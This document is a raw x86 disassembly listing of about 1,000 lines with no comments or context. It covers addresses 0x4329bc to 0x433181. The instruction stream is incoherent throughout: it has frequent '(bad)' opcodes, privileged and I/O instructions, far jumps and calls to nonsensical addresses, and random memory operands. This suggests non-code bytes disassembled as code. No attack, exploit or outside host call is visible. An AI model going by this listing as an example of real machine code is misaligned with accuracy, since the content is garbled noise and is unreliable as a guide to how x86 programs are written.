  4329bc:	retf   0xff54
  4329bf:	push   ecx
  4329c0:	mov    DWORD PTR ds:0x757210,eax
  4329c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4329c9:	sub    esp,DWORD PTR [ebx-0x77]
  4329cc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329d3:	or     ah,bh
  4329d5:	pop    es
  4329d6:	ds fwait
  4329d8:	push   DWORD PTR [edx]
  4329da:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329e0:	(bad)  
  4329e1:	mov    bh,bh
  4329e3:	jmp    0x4329d1
  4329e5:	leave  
  4329e6:	jne    0x4329f0
  4329e8:	call   0x302342
  4329ed:	in     al,dx
  4329ee:	dec    ebp
  4329ef:	add    dh,BYTE PTR [ebx]
  4329f1:	add    BYTE PTR [ebx],al
  4329f3:	inc    ebp
  4329f4:	cmp    esi,DWORD PTR [ecx]
  4329f6:	je     0x432994
  4329f8:	mov    eax,edi
  4329fa:	or     al,0xf0
  4329fc:	add    BYTE PTR [ebp+0x458bf845],al
  432a02:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432a08:	adc    al,0x7
  432a0a:	enter  0x9fc0,0xa5
  432a0e:	rol    BYTE PTR [eax],0x5e
  432a11:	mov    ecx,ecx
  432a13:	or     al,0xc
  432a15:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a1c:	jmp    0x432a1d
  432a1e:	push   ebp
  432a1f:	mov    esp,ebp
  432a21:	cld    
  432a22:	inc    ebp
  432a23:	inc    ebp
  432a24:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a2b:	push   esi
  432a2c:	push   esi
  432a2d:	mov    edi,0x7af080f
  432a32:	add    bh,al
  432a34:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a3a:	add    BYTE PTR [ecx+0x4540100f],cl
  432a40:	mov    ebp,eax
  432a42:	mov    ebp,edi
  432a44:	lock call edx
  432a47:	fcom   DWORD PTR [ebp+0x45]
  432a4a:	mov    eax,0x148a8b
  432a4f:	push   ecx
  432a50:	enter  0xc145,0x83
  432a54:	cmp    ecx,DWORD PTR [eax]
  432a56:	add    BYTE PTR [ebp+0x4d],al
  432a59:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a5f:	call   0xffa325ce
  432a64:	cmp    eax,DWORD PTR [ebp-0xc]
  432a67:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a6b:	push   ebp
  432a6c:	(bad)  
  432a6d:	call   0x342871
  432a72:	mov    bh,0xdb
  432a74:	cld    
  432a75:	or     BYTE PTR [ebp+0x45],bl
  432a78:	(bad)  
  432a79:	call   0xff7d2709
  432a7e:	add    al,BYTE PTR [ebp+0x37]
  432a81:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a87:	jne    0x432a89
  432a89:	(bad)  
  432a8a:	cmp    edi,esp
  432a8c:	jne    0x432abf
  432a8e:	mov    edi,edi
  432a90:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a96:	pop    ds
  432a97:	into   
  432a98:	je     0x432a5b
  432a9a:	mov    ebx,DWORD PTR [esi]
  432a9c:	or     BYTE PTR [ebp-0x49],al
  432a9f:	mov    esp,DWORD PTR [esi-0x77]
  432aa2:	mov    esi,0x2451f0c
  432aa7:	mov    eax,DWORD PTR [eax]
  432aa9:	or     al,0x66
  432aab:	sar    bl,0x3b
  432aae:	xor    esi,DWORD PTR [ebp+0x66]
  432ab1:	xor    ecx,edi
  432ab3:	pop    edi
  432ab4:	adc    bl,BYTE PTR [ebx+0x7e]
  432ab7:	ret    0xff
  432aba:	cld    
  432abb:	inc    ebp
  432abc:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432ac2:	cld    
  432ac3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432aca:	push   0xffffff83
  432acc:	pop    edi
  432acd:	or     BYTE PTR [ebp+0x53],dh
  432ad0:	xorps  xmm1,xmm2
  432ad3:	test   BYTE PTR [eax+eax*1],bh
  432ad6:	add    BYTE PTR [eax],al
  432ad8:	adc    eax,eax
  432ada:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ae2:	jmp    DWORD PTR [eax]
  432ae4:	ror    al,0x5e
  432ae7:	inc    ebp
  432ae8:	leave  
  432ae9:	xor    ecx,DWORD PTR [eax]
  432aeb:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432af1:	add    ah,al
  432af3:	xor    edi,edi
  432af5:	xor    DWORD PTR [ebx],0x66003302
  432afb:	mov    DWORD PTR [ebp-0xc],ecx
  432afe:	pcmpgtw mm0,mm0
  432b01:	add    dl,ah
  432b03:	leave  
  432b04:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432b08:	push   eax
  432b09:	dec    ebp
  432b0a:	mov    esi,DWORD PTR [ebx-0x75]
  432b0d:	lea    ebp,[eax-0x7c00ff02]
  432b13:	xor    eax,DWORD PTR [eax]
  432b15:	sysret 
  432b17:	dec    ebp
  432b18:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b1f:	push   WORD PTR [ecx+0x8]
  432b23:	jne    0x432ae6
  432b25:	ud0    ecx,DWORD PTR [ecx]
  432b28:	mov    eax,edx
  432b2a:	lods   al,BYTE PTR ds:[esi]
  432b2b:	add    BYTE PTR [eax],al
  432b2d:	data16 (bad) 
  432b2f:	iret   
  432b30:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b37:	cli    
  432b38:	inc    ebp
  432b39:	cmp    al,0x8d
  432b3b:	add    BYTE PTR [esi+0x2d],ah
  432b3e:	inc    ebp
  432b3f:	pop    ebp
  432b40:	lea    ecx,[edi]
  432b42:	mov    dl,bh
  432b44:	add    BYTE PTR [edi],cl
  432b46:	mov    DWORD PTR [eax+eax*8],edi
  432b49:	mov    ebx,0x3b87
  432b4e:	add    BYTE PTR [ebx],ch
  432b50:	inc    ebp
  432b51:	data16 (bad) 
  432b53:	clc    
  432b54:	int3   
  432b55:	cmp    eax,DWORD PTR [eax]
  432b57:	je     0x432ae2
  432b59:	push   0xffffffc8
  432b5b:	pop    edi
  432b5c:	xchg   DWORD PTR [ebp+0x0],eax
  432b5f:	data16 add BYTE PTR [ebp+0x45],cl
  432b63:	lea    cx,[ebp+0x10]
  432b67:	jb     0x432b69
  432b69:	jmp    0x432af4
  432b6b:	call   eax
  432b6d:	clc    
  432b6e:	xchg   DWORD PTR [edi+0x1],edi
  432b71:	mov    eax,DWORD PTR [eax]
  432b73:	or     BYTE PTR [ebp-0x49],al
  432b76:	lea    eax,[eax+0x74003154]
  432b7c:	push   edi
  432b7d:	inc    edx
  432b7e:	jge    0x432b7f
  432b80:	mov    DWORD PTR [edi],ecx
  432b82:	fdiv   DWORD PTR [edi-0x6]
  432b85:	inc    DWORD PTR [eax]
  432b87:	xor    edx,DWORD PTR [eax+0x5f]
  432b8a:	xchg   DWORD PTR [ebx+0x1],ebx
  432b8d:	ret    0x0
  432b90:	xor    BYTE PTR [ebp-0x51],cl
  432b93:	cmp    edi,0xf0ff89fe
  432b99:	data16 ror al,0x84
  432b9d:	rol    BYTE PTR [eax],0x3b
  432ba0:	add    al,dh
  432ba2:	dec    eax
  432ba3:	xchg   esp,eax
  432ba4:	push   ebx
  432ba5:	jmp    0x432b32
  432ba7:	push   ebp
  432ba8:	add    esp,ebp
  432baa:	add    ebp,esp
  432bac:	mov    edx,DWORD PTR [edi+0x24]
  432baf:	clc    
  432bb0:	dec    esi
  432bb1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432bb7:	cmp    BYTE PTR [ebx],al
  432bb9:	jne    0x432b44
  432bbb:	xor    esp,eax
  432bbd:	jmp    0x462d40
  432bc2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bc5:	jne    0x432bbb
  432bc7:	call   0xffcd2921
  432bcc:	clc    
  432bcd:	xchg   edi,eax
  432bce:	sti    
  432bcf:	add    DWORD PTR [ebx],eax
  432bd1:	add    BYTE PTR [ebp+0x47],bl
  432bd4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bda:	pop    ebp
  432bdb:	mov    DWORD PTR [esi-0x48],esi
  432bde:	jmp    0x432c27
  432be0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432be6:	(bad)  
  432be8:	cmp    al,0x0
  432bea:	cmp    eax,DWORD PTR [ebp+0x18]
  432bed:	lea    ebx,[ebp-0x56]
  432bf0:	jle    0x432bf2
  432bf2:	jae    0x432b7d
  432bf4:	mov    eax,esp
  432bf6:	call   0xb900:0x8b005587
  432bfd:	inc    ebp
  432bfe:	push   ebp
  432bff:	lea    ecx,[ebp-0x27ff4f12]
  432c05:	mov    eax,edi
  432c07:	int3   
  432c08:	push   ebp
  432c09:	xchg   edi,eax
  432c0b:	add    esp,ebp
  432c0d:	add    BYTE PTR [eax],al
  432c0f:	inc    ebp
  432c10:	add    BYTE PTR [ebp+0x8b3255],cl
  432c16:	cld    
  432c17:	mov    DWORD PTR [edx],edi
  432c19:	aam    0x75
  432c1b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c21:	mov    DWORD PTR [ebx-0x50],edx
  432c24:	test   BYTE PTR [ebp-0x1],0xe8
  432c28:	mov    eax,DWORD PTR [eax]
  432c2a:	hlt    
  432c2b:	add    al,al
  432c2d:	mov    eax,DWORD PTR ds:0x890045a8
  432c33:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c39:	inc    DWORD PTR [eax*2+0xf75854d]
  432c40:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c46:	call   0x72998987
  432c4b:	je     0x432cab
  432c4d:	js     0x432cae
  432c4f:	lock ret 0x7e
  432c53:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c59:	mov    edi,edi
  432c5b:	sbb    al,bl
  432c5d:	clc    
  432c5e:	add    BYTE PTR [ebp-0x73],bh
  432c61:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c67:	ror    BYTE PTR [eax],1
  432c69:	dec    ebp
  432c6a:	xchg   ebp,eax
  432c6b:	mov    edi,edi
  432c6d:	in     al,0x8b
  432c6f:	jge    0x432bfa
  432c71:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c77:	clc    
  432c78:	pop    esi
  432c79:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c7f:	clc    
  432c80:	add    al,0x6e
  432c82:	mov    eax,DWORD PTR [ebx]
  432c84:	mov    BYTE PTR [ebp+0x0],dl
  432c87:	mov    edx,DWORD PTR [ebx-0x20]
  432c8a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c90:	add    eax,0x3b3b73
  432c95:	adc    al,0x89
  432c97:	pop    eax
  432c98:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c9c:	ret    0xf08
  432c9f:	cmp    al,0x2
  432ca1:	mov    edx,eax
  432ca3:	cld    
  432ca4:	add    BYTE PTR [ebp+0x66],dl
  432ca7:	add    eax,ebx
  432ca9:	add    esp,eax
  432cab:	sub    eax,eax
  432cad:	or     BYTE PTR [ecx-0x77f474bb],cl
  432cb3:	add    BYTE PTR [eax],al
  432cb5:	mov    DWORD PTR [ebx-0x24],ebx
  432cb8:	push   edi
  432cb9:	push   ebp
  432cba:	clc    
  432cbb:	add    DWORD PTR [esi+0x1b0100],0x45
  432cc2:	out    0xff,eax
  432cc4:	add    edx,DWORD PTR [eax]
  432cc6:	jmp    0x432cb0
  432cc8:	cmp    ch,0x46
  432ccb:	(bad)  
  432ccc:	jmp    0x40c8b51e
  432cd1:	je     0x432c5d
  432cd3:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cd9:	inc    ebp
  432cda:	add    BYTE PTR [ebx-0x770375],al
  432ce0:	add    ah,ch
  432ce2:	add    edx,esp
  432ce4:	pop    edi
  432ce5:	pop    ebp
  432ce6:	push   ebp
  432ce7:	inc    ebx
  432ce8:	in     al,dx
  432ce9:	pop    ebp
  432cea:	in     al,dx
  432ceb:	cmp    edx,DWORD PTR [edi-0x8]
  432cee:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432cf5:	add    al,0x47
  432cf7:	push   ebp
  432cf8:	mov    esp,ebp
  432cfa:	in     al,0x45
  432cfc:	dec    ebp
  432cfd:	push   esi
  432cfe:	test   DWORD PTR [eax+0xfb010f],esi
  432d04:	add    BYTE PTR [eax+0xc018b],dh
  432d0a:	leave  
  432d0b:	inc    ebp
  432d0c:	test   al,ch
  432d0e:	add    dh,bh
  432d10:	add    bh,bh
  432d12:	dec    ebp
  432d13:	push   cs
  432d14:	mov    DWORD PTR [ecx],eax
  432d16:	hlt    
  432d17:	push   es
  432d18:	dec    ebp
  432d19:	leave  
  432d1a:	mov    DWORD PTR [eax],ecx
  432d1c:	clc    
  432d1d:	cmovge eax,ecx
  432d20:	mov    ecx,0x85c2f0
  432d26:	clc    
  432d27:	pop    DWORD PTR [ebp+0x1]
  432d2a:	push   ebx
  432d2b:	add    BYTE PTR [ebp-0x15],bh
  432d2e:	push   esi
  432d2f:	xor    eax,0x898a45
  432d34:	cld    
  432d35:	add    al,BYTE PTR [ebp+0x0]
  432d38:	xor    esp,DWORD PTR [esi-0x64]
  432d3b:	add    DWORD PTR [esi+0x78308c1],edi
  432d41:	add    ah,BYTE PTR [ebp-0x49]
  432d44:	int    0xbb
  432d46:	mov    ecx,DWORD PTR [esi+0xc]
  432d49:	add    dh,al
  432d4b:	cmp    ecx,ebx
  432d4d:	jne    0x432d17
  432d4f:	xor    ecx,DWORD PTR [ebp+0x66]
  432d52:	jmp    0xca2d58
  432d57:	add    DWORD PTR [ebp+0x0],eax
  432d5a:	mov    eax,ebx
  432d5c:	or     al,0x8b
  432d5e:	(bad)  
  432d5f:	mov    ecx,esi
  432d61:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d68:	mov    eax,edi
  432d6a:	or     BYTE PTR [edx],cl
  432d6c:	shl    cl,cl
  432d6e:	icebp  
  432d6f:	add    BYTE PTR [ebp+0x38],0x8b
  432d73:	or     BYTE PTR [edx+eax*2],cl
  432d76:	(bad)  
  432d77:	or     cl,dh
  432d79:	stc    
  432d7a:	shl    DWORD PTR [ebp-0x30],0xc6
  432d7e:	xor    al,0x0
  432d80:	inc    ebp
  432d81:	xchg   BYTE PTR [ebx],al
  432d83:	add    esp,edi
  432d85:	add    BYTE PTR [ebp-0x39],cl
  432d88:	mov    al,bl
  432d8a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d90:	sub    al,0xbf
  432d92:	jmp    0x432d19
  432d94:	mov    edi,eax
  432d96:	lock jge 0x432d8a
  432d99:	lea    esi,[edx-0x74bad5ff]
  432d9f:	mov    ebp,esp
  432da1:	or     cl,dh
  432da3:	leave  
  432da4:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432dab:	dec    ebp
  432dac:	dec    ebp
  432dad:	test   DWORD PTR [ebx],eax
  432daf:	paddb  mm6,mm0
  432db2:	add    DWORD PTR [eax],eax
  432db4:	dec    ebp
  432db5:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432dbb:	mov    esi,DWORD PTR [edx]
  432dbd:	or     al,0x2b
  432dbf:	dec    ebp
  432dc0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432dc6:	mov    esp,edi
  432dc8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dcf:	mov    DWORD PTR [ebx],ebp
  432dd1:	call   0xc76b701
  432dd6:	mov    DWORD PTR [ebp+0x10],ecx
  432dd9:	(bad)  
  432dda:	push   0x8b85ff10
  432ddf:	clc    
  432de0:	or     al,0x54
  432de2:	(bad)  
  432de3:	push   ecx
  432de4:	retf   
  432de5:	mov    ebx,0xff4d8dc8
  432dea:	mov    DWORD PTR [ebp+0x8],eax
  432ded:	xor    eax,DWORD PTR [ebp-0x75]
  432df0:	cmp    ebp,DWORD PTR [ebx]
  432df2:	lsl    ebx,WORD PTR [edi-0x8]
  432df6:	call   DWORD PTR [ebx-0x741bff75]
  432dfc:	(bad)  
  432dfd:	or     al,0x5b
  432dff:	dec    ebp
  432e00:	or     BYTE PTR [ebx],dh
  432e02:	inc    ebp
  432e03:	xor    esi,DWORD PTR ds:0x708088d
  432e09:	in     eax,0x9b
  432e0b:	add    BYTE PTR [edx],dh
  432e0d:	inc    ebp
  432e0e:	pop    edi
  432e0f:	xor    eax,edx
  432e11:	test   DWORD PTR [eax],0x81108b8b
  432e17:	dec    ebp
  432e18:	sub    al,0x33
  432e1a:	add    BYTE PTR [ebx],dh
  432e1c:	push   esi
  432e1d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e23:	mov    edi,eax
  432e25:	or     BYTE PTR [ebp+0x45],al
  432e28:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e2e:	xor    ecx,ecx
  432e30:	pushf  
  432e31:	push   es
  432e32:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e39:	dec    ebp
  432e3a:	inc    ebp
  432e3b:	cmp    BYTE PTR [ecx],0x54
  432e3e:	pushf  
  432e3f:	gs (bad) 
  432e41:	shl    esp,1
  432e43:	dec    ebp
  432e44:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e4a:	shr    ecx,1
  432e4c:	xlat   BYTE PTR ds:[ebx]
  432e4d:	rol    bh,cl
  432e4f:	mov    edx,esp
  432e51:	or     BYTE PTR [ebp+0x4588f84d],al
  432e57:	mov    ecx,DWORD PTR [eax]
  432e59:	or     BYTE PTR [eax],al
  432e5b:	push   ebp
  432e5c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e62:	dec    ebp
  432e63:	enter  0xceba,0x8
  432e67:	retf   0x1807
  432e6a:	ret    0x9b4d
  432e6d:	mov    esi,DWORD PTR [edx]
  432e6f:	or     al,0x33
  432e71:	into   
  432e72:	add    edx,esi
  432e74:	add    ecx,edx
  432e76:	bswap  eax
  432e78:	ror    esi,0x98
  432e7b:	dec    ebp
  432e7c:	add    cl,ch
  432e7e:	mov    edi,edi
  432e80:	hlt    
  432e81:	inc    esi
  432e83:	inc    ebp
  432e84:	ret    0x4533
  432e87:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e8d:	or     BYTE PTR [ebx],dh
  432e8f:	dec    ebp
  432e90:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e96:	jne    0xff8d2e5d
  432e9c:	inc    ebp
  432e9d:	inc    ebp
  432e9e:	mov    esi,DWORD PTR [ebx]
  432ea0:	clc    
  432ea1:	pop    esi
  432ea2:	ret    0xcaeb
  432ea5:	mov    eax,esi
  432ea7:	call   0x5204837a
  432eac:	dec    ebp
  432ead:	add    eax,0xf8728b
  432eb2:	adc    eax,0xce0ccac9
  432eb7:	push   ebp
  432eb8:	ret    0xc6ec
  432ebb:	in     al,dx
  432ebc:	call   0x33437bc5
  432ec1:	push   edi
  432ec2:	add    edi,eax
  432ec4:	xor    eax,eax
  432ec6:	jmp    0x432f0d
  432ec8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432ece:	add    eax,edi
  432ed0:	shr    eax,cl
  432ed2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ed8:	mov    esi,DWORD PTR [edx]
  432eda:	in     al,dx
  432edb:	pushf  
  432edc:	ret    0x84c7
  432edf:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ee5:	inc    ebp
  432ee6:	in     al,dx
  432ee7:	xor    DWORD PTR [ebp-0x64],eax
  432eea:	mov    eax,edi
  432eec:	cld    
  432eed:	fmul   st(2),st
  432eef:	sbb    dl,al
  432ef1:	jmp    0x9c3b:0x304d45c1
  432ef8:	jbe    0x432ec1
  432efa:	mov    esp,eax
  432efc:	clc    
  432efd:	add    BYTE PTR [ebp+0x0],cl
  432f00:	mov    ecx,ecx
  432f02:	lea    eax,[ebp-0x5]
  432f05:	mov    edi,edi
  432f07:	call   0x51ce8351
  432f0c:	hlt    
  432f0d:	xor    eax,edx
  432f0f:	mov    esi,0x9b7284
  432f14:	xor    cl,dl
  432f16:	mov    esi,eax
  432f18:	hlt    
  432f19:	into   
  432f1a:	inc    ebp
  432f1b:	scas   eax,DWORD PTR es:[edi]
  432f1c:	mov    ebp,ecx
  432f1e:	cld    
  432f1f:	add    dl,cl
  432f21:	add    dl,al
  432f23:	inc    ebp
  432f24:	shr    DWORD PTR [ebx],0x4d
  432f27:	xor    edi,DWORD PTR [ebx]
  432f29:	mov    DWORD PTR [edi],ecx
  432f2b:	clc    
  432f2c:	dec    esi
  432f2d:	inc    ebp
  432f2e:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f34:	ret    0xc6ca
  432f37:	mov    BYTE PTR [ebp-0x32],0x53
  432f3b:	scas   eax,DWORD PTR es:[edi]
  432f3c:	inc    ebp
  432f3d:	jmp    0x432f6f
  432f3f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f46:	pop    ebx
  432f47:	xor    ecx,DWORD PTR [ebp+0x3]
  432f4a:	mov    eax,DWORD PTR [ebx]
  432f4c:	clc    
  432f4d:	test   edx,ecx
  432f4f:	mov    ecx,esi
  432f51:	cld    
  432f52:	call   0x8ab7749c
  432f57:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f5d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f63:	fdiv   QWORD PTR [ebx]
  432f65:	retf   0xce89
  432f68:	in     al,0xc1
  432f6a:	inc    ebp
  432f6b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f71:	into   
  432f72:	mov    dh,0xc1
  432f75:	call   0x8c1774fe
  432f7a:	(bad)  
  432f7b:	cld    
  432f7c:	mov    ecx,DWORD PTR [ebp-0x14]
  432f7f:	xor    eax,ecx
  432f81:	lea    eax,[ebp+0x8]
  432f84:	mov    esi,DWORD PTR [edx-0x4]
  432f87:	add    dl,al
  432f89:	inc    ebp
  432f8a:	mov    esp,0x32d89b8b
  432f8f:	dec    ebp
  432f90:	mov    esi,DWORD PTR [ebx]
  432f92:	cld    
  432f93:	xor    eax,edx
  432f95:	sub    esp,DWORD PTR [ebp-0x75]
  432f98:	int    0xec
  432f9a:	sub    ecx,eax
  432f9c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432fa2:	mov    esi,esp
  432fa4:	call   0x34177d2d
  432fa9:	inc    DWORD PTR [ebx]
  432fab:	mov    edi,DWORD PTR [ebx]
  432fad:	cld    
  432fae:	jne    0x432ffd
  432fb0:	mov    esi,DWORD PTR [ebx]
  432fb2:	aam    0x8d
  432fb4:	dec    ebp
  432fb5:	or     BYTE PTR [ebx],dh
  432fb7:	jb     0x432fbc
  432fb9:	add    BYTE PTR [edi+0x45],bl
  432fbc:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432fc3:	xor    ebp,esp
  432fc5:	xor    eax,edi
  432fc7:	sub    edi,esp
  432fc9:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fcf:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fd6:	inc    ebp
  432fd7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fdd:	clc    
  432fde:	mov    eax,edi
  432fe0:	nop
  432fe1:	fadd   QWORD PTR [eax]
  432fe3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fe9:	jmp    0x432f74
  432feb:	mov    eax,DWORD PTR [ecx]
  432fed:	fadd   DWORD PTR [eax]
  432fef:	inc    ebp
  432ff0:	or     DWORD PTR [ebx],esi
  432ff2:	dec    eax
  432ff3:	add    edx,DWORD PTR [ebx-0x2d]
  432ff6:	dec    ebp
  432ff7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432ffd:	inc    ebp
  432ffe:	push   esp
  432fff:	mov    dl,BYTE PTR [ecx-0xd]
  433002:	xor    ecx,DWORD PTR [ebp-0x45]
  433005:	(bad)  
  433007:	rol    BYTE PTR [eax],0xc1
  43300a:	ret    
  43300b:	inc    ebp
  43300c:	inc    ebp
  43300d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433013:	xor    eax,ebx
  433015:	add    eax,DWORD PTR [ebp+0x23]
  433018:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43301e:	cmp    edi,0xc
  433021:	dec    ebp
  433022:	inc    ebp
  433023:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433029:	inc    ebp
  43302a:	mov    esi,DWORD PTR [ebx]
  43302c:	clc    
  43302d:	lea    eax,[ebp+0x45725407]
  433033:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433037:	xor    edi,DWORD PTR [eax]
  433039:	mov    ecx,0xff8b8d4d
  43303e:	push   esp
  43303f:	enter  0x4df7,0x23
  433043:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433049:	mov    eax,DWORD PTR [ebx]
  43304b:	loopne 0x433038
  43304d:	ret    0xc68b
  433050:	push   esp
  433051:	enter  0x9745,0x8b
  433055:	inc    ebp
  433056:	cld    
  433057:	mov    eax,edi
  433059:	clc    
  43305a:	ret    
  43305b:	ret    0xc645
  43305e:	mov    esi,DWORD PTR [ebx]
  433060:	cld    
  433061:	pop    esi
  433062:	mov    ebx,0x83458bc3
  433068:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43306c:	dec    ebp
  43306d:	xor    DWORD PTR [ebx],esi
  43306f:	pushf  
  433070:	add    edi,DWORD PTR [edx-0x7767a77]
  433076:	fcom   DWORD PTR [ebp+0x45]
  433079:	mov    esi,DWORD PTR [ebx]
  43307b:	adc    al,0x9c
  43307d:	inc    ebp
  43307e:	(bad)  
  43307f:	mov    ebx,eax
  433081:	adc    al,0x85
  433083:	cmp    al,0x1
  433086:	inc    ebp
  433087:	add    BYTE PTR ds:0xe98b9c4d,bh
  43308d:	mov    eax,DWORD PTR [ebx]
  43308f:	nop
  433090:	add    BYTE PTR [eax],al
  433092:	inc    ebp
  433093:	mov    esi,DWORD PTR [ebx]
  433095:	add    eax,DWORD PTR [ebx]
  433097:	cmp    al,0x89
  433099:	mov    esp,esi
  43309b:	clc    
  43309c:	inc    ebp
  43309d:	inc    ebp
  43309e:	add    edx,DWORD PTR [esi+0xc]
  4330a1:	mov    edi,0x7ff0845
  4330a6:	in     al,dx
  4330a7:	(bad)  
  4330a8:	jne    0x433045
  4330aa:	mov    esi,DWORD PTR [edx]
  4330ac:	clc    
  4330ad:	add    ebp,DWORD PTR [esi]
  4330af:	mov    edi,edi
  4330b1:	in     al,dx
  4330b2:	mov    DWORD PTR [ebp-0x10],eax
  4330b5:	xor    eax,DWORD PTR [ebp+0x3]
  4330b8:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330be:	fmul   DWORD PTR [ebx-0x173caf39]
  4330c4:	lea    ecx,[ecx+0x45e8d4bc]
  4330ca:	clc    
  4330cb:	mov    edi,edi
  4330cd:	cmp    BYTE PTR [ebp+0x4d],al
  4330d0:	test   DWORD PTR [eax+0x74],ecx
  4330d3:	inc    ecx
  4330d4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330da:	ret    
  4330db:	inc    eax
  4330dc:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330e2:	push   eax
  4330e3:	dec    eax
  4330e4:	test   al,0xd0
  4330e6:	dec    eax
  4330e8:	mov    eax,DWORD PTR [ebp-0x14]
  4330eb:	mov    eax,DWORD PTR [ebp+0x38]
  4330ee:	mov    eax,ecx
  4330f0:	fadd   DWORD PTR [ebx]
  4330f2:	dec    ebp
  4330f3:	inc    eax
  4330f4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330fa:	inc    ebp
  4330fb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433101:	fadd   QWORD PTR [ebx]
  433103:	inc    ebp
  433104:	or     al,0x33
  433106:	dec    ebp
  433107:	add    edi,DWORD PTR [ebx]
  433109:	mov    DWORD PTR [edx-0x28],esi
  43310c:	mov    eax,DWORD PTR [ebp-0x10]
  43310f:	mov    eax,DWORD PTR [eax+0x10]
  433112:	mov    eax,edi
  433114:	lock ret 
  433116:	inc    ecx
  433117:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43311d:	fsubr  st,st(5)
  43311f:	test   DWORD PTR [eax],eax
  433121:	clc    
  433122:	push   0x45
  433124:	(bad)  
  433125:	cmp    al,0xec
  433127:	pushf  
  433128:	inc    ebp
  433129:	(bad)  
  43312a:	push   eax
  43312b:	fsub   DWORD PTR [eax-0x7b]
  43312e:	(bad)  
  43312f:	clc    
  433130:	mov    eax,0xf8008584
  433135:	mov    eax,DWORD PTR [ebp-0x4]
  433138:	mov    edi,0x4585c3cc
  43313e:	clc    
  43313f:	mov    eax,DWORD PTR [ebp+0x14]
  433142:	xor    eax,DWORD PTR [ebp-0x64]
  433145:	mov    edi,eax
  433147:	in     al,dx
  433148:	les    esi,FWORD PTR [ebp-0x7b]
  43314b:	mov    edi,eax
  43314d:	or     al,0x4d
  43314f:	dec    ebp
  433150:	mov    eax,ebp
  433152:	in     al,0xf2
  433154:	dec    ebp
  433155:	dec    DWORD PTR [ecx+0x4dc7e045]
  43315b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433161:	inc    ebp
  433162:	mov    DWORD PTR [ebx],esi
  433164:	fadd   QWORD PTR [ebx]
  433166:	dec    ebp
  433167:	push   eax
  433168:	xor    eax,DWORD PTR [ebp+0x3]
  43316b:	push   eax
  43316c:	mov    DWORD PTR [eax+ebx*8],ebx
  43316f:	push   esi
  433171:	mov    eax,DWORD PTR [eax]
  433173:	lock cmp eax,0xf84e85c0
  433179:	inc    ebp
  43317a:	test   BYTE PTR [ebx],dh
  43317c:	add    DWORD PTR [ebx],eax
  43317e:	add    BYTE PTR [eax+0x4d],dl
  433181:	jne    0x4331b6
